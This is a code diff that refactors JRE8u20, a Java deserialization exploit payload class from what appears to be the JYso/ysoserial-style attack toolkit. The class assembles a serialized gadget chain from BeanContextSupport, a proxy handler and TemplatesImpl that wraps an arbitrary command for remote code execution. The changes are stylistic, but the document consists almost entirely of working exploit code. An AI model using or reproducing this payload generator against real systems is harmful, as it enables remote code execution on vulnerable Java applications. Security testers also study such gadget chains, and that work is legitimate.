@@ -18,7 +18,7 @@ import java.util.Map;
 import static com.qi4l.JYso.Starter.JYsoMode;
 
 
-@SuppressWarnings({"unused"})
+@SuppressWarnings({"rawtypes", "unused"})
 @Dependencies
 @Authors({"frohoff"})
 public class JRE8u20 implements ObjectPayload<Object> {
@@ -55,9 +55,9 @@ public class JRE8u20 implements ObjectPayload<Object> {
         TCClassDesc beanContextChildSupportDesc = new TCClassDesc("java.beans.beancontext.BeanContextChildSupport");
         beanContextSupportDesc.addField(new TCClassDesc.Field("serializable", int.class));
         TCObject.ObjectData beanContextSupportData = new TCObject.ObjectData();
-        beanContextSupportData.addData(Integer.valueOf(1));
+        beanContextSupportData.addData(1);
         beanContextSupportData.addData(handler);
-        beanContextSupportData.addData(Integer.valueOf(0), true);
+        beanContextSupportData.addData(0, true);
         beanContextChildSupportDesc.addField(new TCClassDesc.Field("beanContextChildPeer", BeanContextChild.class));
         TCObject.ObjectData beanContextChildSupportData = new TCObject.ObjectData();
         beanContextChildSupportData.addData(obj);
@@ -74,7 +74,7 @@ public class JRE8u20 implements ObjectPayload<Object> {
     public Object getObject(String command) throws Exception {
         Serialization ser = new Serialization();
         Object templates = makeTemplates(command);
-        HashMap<Object, Object> map = new HashMap<Object, Object>();
+        HashMap<Object, Object> map = new HashMap<>();
         map.put("f5a5a608", templates);
         TCObject handler = makeHandler(map, ser);
         TCObject linkedHashset = new TCObject(ser);
@@ -84,9 +84,9 @@ public class JRE8u20 implements ObjectPayload<Object> {
         hashsetDesc.addField(new TCClassDesc.Field("fake", BeanContextSupport.class));
         TCObject.ObjectData hashsetData = new TCObject.ObjectData();
         hashsetData.addData(makeBeanContextSupport(handler, ser));
-        hashsetData.addData(Integer.valueOf(10), true);
-        hashsetData.addData(Float.valueOf(1.0F), true);
-        hashsetData.addData(Integer.valueOf(2), true);
+        hashsetData.addData(10, true);
+        hashsetData.addData(1.0F, true);
+        hashsetData.addData(2, true);
         hashsetData.addData(templates);
         TCObject proxy = Util.makeProxy(new Class[]{Map.class}, handler, ser);
         hashsetData.addData(proxy);
@@ -100,8 +100,7 @@ public class JRE8u20 implements ObjectPayload<Object> {
         }
         ByteArrayOutputStream out = new ByteArrayOutputStream();
         ser.write(out);
-        byte[] bytes = out.toByteArray();
-        return bytes;
+        return out.toByteArray();
     }
 
 }
